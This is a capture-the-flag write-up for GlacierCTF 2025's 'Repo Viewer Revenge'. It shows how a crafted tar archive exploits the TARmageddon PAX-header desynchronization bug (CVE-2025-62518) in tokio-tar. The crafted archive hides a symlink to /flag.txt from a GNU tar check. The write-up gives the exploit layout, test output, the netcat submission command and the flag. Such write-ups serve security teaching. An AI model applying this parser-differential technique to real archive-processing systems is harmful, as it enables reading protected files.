# GlacierCTF 2025 - Repo Viewer Revenge Writeup


<img src="https://github.com/t4mpr/ctf-writeups/blob/main/GlacierCTF-2025-Writeups/images/repo-viewer-revenge-chal.png?raw=true" alt="Repo_Viewer_Revenge" width="50%"/>







## Description

```
My trusty coreutils have failed me! Maybe rust can save the day?

nc challs.glacierctf.com 13379
```

This is a follow-up to the "Repo Viewer" challenge, now using Rust for "100% memory safety".

## Overview

This challenge exploits **CVE-2025-62518 (TARmageddon)**, a critical vulnerability in Rust's tokio-tar library where PAX extended headers cause desynchronization during tar extraction. The vulnerability allows us to bypass symlink detection and extract malicious symlinks that the bash validation doesn't see.

## Analysis

### Challenge Changes from Original

The challenge made several changes from the original "Repo Viewer":

1. **Input Format**: Now accepts gzipped tar files instead of git bundles
2. **Rust Implementation**: Uses a Rust binary (`/app/repo-viewer`) instead of bash+less+lesspipe
3. **Symlink Detection**: Added bash check using `tar -tvzf - | grep '^[lh]'`
4. **No .lessfilter**: The original exploit vector is removed

### Challenge Script

```bash
#!/bin/bash
set -euo pipefail

echo "Welcome to the improved secure Repo Viewer (100% memory safe)!"
echo "Submit a .tar to view its README"
echo "Input base64-encoded tar file:"
read -d @ b64data

# Check for symlinks/hardlinks using GNU tar
if [ "$(printf %s "${b64data}" | base64 -d | tar -tvzf - | grep '^[lh]' | wc -l)" -gt 0 ]; then
    echo "Symlink detected, aborting!"
    exit 1
fi

# Extract and view using Rust binary
printf %s "${b64data}" | base64 -d | /app/repo-viewer

echo "Goodbye!"
```

The script:
1. Decodes base64 input
2. Checks for symlinks ('l') or hardlinks ('h') using GNU tar listing
3. If clean, pipes the same data to the Rust binary
4. The Rust binary extracts to `/tmp/` and displays `/tmp/README.md`

### The Vulnerability: CVE-2025-62518 (TARmageddon)

**TARmageddon** is a desynchronization bug in tokio-tar and related Rust tar libraries when processing PAX extended headers.

#### Normal TAR Processing
```
Header → Content (size from octal field) → Next Header
```

#### PAX Extended TAR (Correct Behavior)
```
PAX Header (size override) → File Header (octal=0) → Content (PAX size) → Next Header
```

#### PAX Extended TAR (Buggy Behavior)
```
PAX Header (size=1024) → File Header (octal=0) → Skip 0 bytes (WRONG!) →
    Reading content as headers! → Extracting embedded "files"
```

**The Bug**: The library reads the octal size field (often zero for large files) instead of applying the PAX size override before calculating the next header position. This causes it to jump into file content and interpret it as tar headers!

### Exploitation Strategy

1. **Create a PAX header** that specifies `size=1536` for a file
2. **Create a file entry** with **octal size = 0** (so GNU tar sees it as empty)
3. **Embed fake tar headers** in the file content:
   - First 512 bytes: A symlink header for `README.md -> /flag.txt`
   - This header is valid but hidden inside the "content"
4. When GNU tar lists the archive, it sees:
   - Normal files only (no symlinks detected)
5. When the buggy Rust extractor processes it:
   - Reads PAX header but uses octal size (0) for positioning
   - Skips 0 bytes and lands in our embedded content
   - Interprets our fake symlink header as real
   - Extracts `README.md` as a symlink to `/flag.txt`!

## Solution

### Creating the Exploit

The exploit generator creates a carefully crafted tar file:

```python
#!/usr/bin/env python3
# See full code in exploit.py

# Key components:
1. Dummy file (passes initial checks)
2. PAX header with size=1536
3. Blob file with:
   - Octal size: 0 (GNU tar sees empty file)
   - PAX size: 1536 (actual content size)
   - Content contains:
     * Embedded symlink tar header (README.md -> /flag.txt)
     * Additional padding
4. End-of-archive marker
```

### Exploit Structure

```
[Normal File Header]
[Content: "Dummy\n"]

[PAX Header: PaxHeader/blob.bin]
[PAX Content: "13 size=1536\n"]

[Blob Header: blob.bin, octal_size=0]  ← GNU tar stops here (sees 0 bytes)
[Blob Content: 1536 bytes]             ← Rust jumps here!
    [Embedded: Symlink Header README.md -> /flag.txt]
    [Embedded: Additional content...]

[EOF Marker]
```

### Testing the Bypass

```bash
# GNU tar sees no symlinks
$ tar -tvzf exploit.tar.gz | grep '^[lh]' | wc -l
0

# Rust extractor creates the symlink
$ ./repo-viewer < exploit.tar.gz
Found entry: dummy.txt
Found entry: blob.bin
Found entry: README.md    ← This is our embedded symlink!
Extracted README.md

$ ls -la /tmp/README.md
lrwxrwxrwx ... /tmp/README.md -> /flag.txt
```

### Sending the Exploit

```bash
# Generate the exploit
python3 exploit.py

# Send to server
(base64 exploit.tar.gz; echo "@") | nc challs.glacierctf.com 13379
```

### Result

```
Welcome to the improved secure Repo Viewer (100% memory safe)!
Submit a .tar to view its README
Input base64-encoded tar file:
Found entry: dummy.txt
Found entry: blob.bin
Found entry: README.md
Extracted README.md

--- README.md contents ---
gctf{Ru5t_m4k3s_3v3Ry7h1ng_5eCuR3_71a9f2ed8}

Goodbye!
```

**Flag:** `gctf{Ru5t_m4k3s_3v3Ry7h1ng_5eCuR3_71a9f2ed8}`

## Files

- **[exploit.py](files/exploit.py)** - Python script to generate the malicious tar.gz 
- **[exploit.tar.gz](files/exploit.tar.gz)** - Pre-built exploit ready to send 


## Tools Used

- Claude-Code CLI - Sonnet 4.5 
- Python 3 - Exploit generator
- GNU tar - Testing and validation
- base64 - Encoding for transmission
- nc (netcat) - Network communication

## Key Takeaways

1. **Memory Safety ≠ Logic Safety**: Rust prevents memory corruption but can't prevent logic bugs like desynchronization

2. **Defense in Depth Failed**: The bash validation used GNU tar while the extraction used a buggy Rust library, creating a gap

3. **PAX Headers are Complex**: Extended tar formats add complexity that can lead to parser desynchronization

4. **TOCTOU at Library Level**: Time-of-check-time-of-use, but between different parsers (GNU vs Rust)

5. **Recent CVE**: CVE-2025-62518 was disclosed in October 2025, affecting tokio-tar and forks

## Technical Details

### CVE-2025-62518 Information

- **CVSS Score**: 8.1 (High)
- **Affected Libraries**:
  - `tokio-tar` (abandoned, 7M+ downloads)
  - `async-tar`
  - `krata-tokio-tar`
  - `astral-tokio-tar` (< 0.5.6)
- **Fixed In**: astral-tokio-tar 0.5.6+
- **Disclosure**: Edera Inc., October 2025

### Why the Challenge Name?

"My trusty coreutils have failed me!" - The challenge creator tried to use GNU tar (`tar -tvzf`) for validation, which is part of coreutils. But switching to Rust's tokio-tar for extraction introduced a new vulnerability that coreutils doesn't have!

The irony: "100% memory safe" Rust code still has critical security bugs when logic is flawed.

## References

- [TARmageddon CVE-2025-62518](https://edera.dev/stories/tarmageddon)
- [GitHub POC Repository](https://github.com/edera-dev/cve-tarmageddon)
- [SecurityWeek Article](https://www.securityweek.com/tarmageddon-flaw-in-popular-rust-library-leads-to-rce/)
- [The Hacker News Coverage](https://thehackernews.com/2025/10/tarmageddon-flaw-in-async-tar-rust.html)

## Acknowledgements 

Thank you to the **[GlacierCTF Team](https://discord.com/invite/XMubqKJZGS)** for putting on a great event and to my team **[LiL L3aK!](https://ctftime.org/team/373171/)**

**-t4mpr**

